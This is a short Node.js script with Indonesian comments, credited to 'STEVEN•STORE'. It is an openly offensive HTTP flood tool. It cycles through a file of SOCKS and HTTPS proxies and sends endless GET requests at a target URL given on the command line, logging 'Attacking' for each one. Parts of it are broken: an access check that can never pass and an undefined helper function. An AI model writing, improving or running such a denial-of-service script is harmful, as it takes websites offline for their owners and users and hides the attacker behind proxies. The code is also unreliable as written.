//Method By STEVEN•STORE🕊🪽
const fs = require('fs');
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');

const userIP = 'panelgw.pteroqdactyl.my.id'; // Masukkan Link Panel Tanpa https://
const targetUrl = process.argv[2]; // Ganti Dengan URL Tujuan Yang Sesuai
const proxyListFile = 'proxy.txt'; // Nama File Yang Berisi Daftar Proxy
const totalRequests = 5000;



































const delay = 100;

function readProxyList() {
  try {
    const data = fs.readFileSync(proxyListFile, 'utf8');
    const lines = data.trim().split('\n');
    return lines.map(line => line.trim());
  } catch (error) {
    console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

function sendRequest(target, agent, userIP) {
  if (allowedIPs.includes(userIP)) {
    axios.get(target, { httpAgent: agent }) // Menggunakan httpAgent untuk proxy SOCKS
      .then((response) => {
        console.log(`Attacking ${target}`);
        // Lakukan sesuatu dengan respons
      })
      .catch((error) => {
        console.error(`Attacking ${target}`);
        // Tangani kesalahan
      });
  } else {
    console.error(`IP Mu Tidak Terdaftar`);
  }
}

function sendRequests() {
  const proxyList = readProxyList();
  let currentIndex = 0;

  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      const proxyUrl = proxyList[currentIndex];

      let agent;

      if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
        agent = new SocksProxyAgent(proxyUrl);
      } else if (proxyUrl.startsWith('https')) {
        agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) }); // Menggunakan HttpsProxyAgent dengan protocol 'http'
      }

      sendRequest(targetUrl, agent, userIP);
      currentIndex++;
      setTimeout(sendRequestUsingNextProxy, 0);
    } else {
      setTimeout(sendRequests, delay);
    }
  }

  sendRequestUsingNextProxy();
}
const allowedIPs = ['PermenMD'];
// Mendapatkan alamat IP pengguna

sendRequests();

          
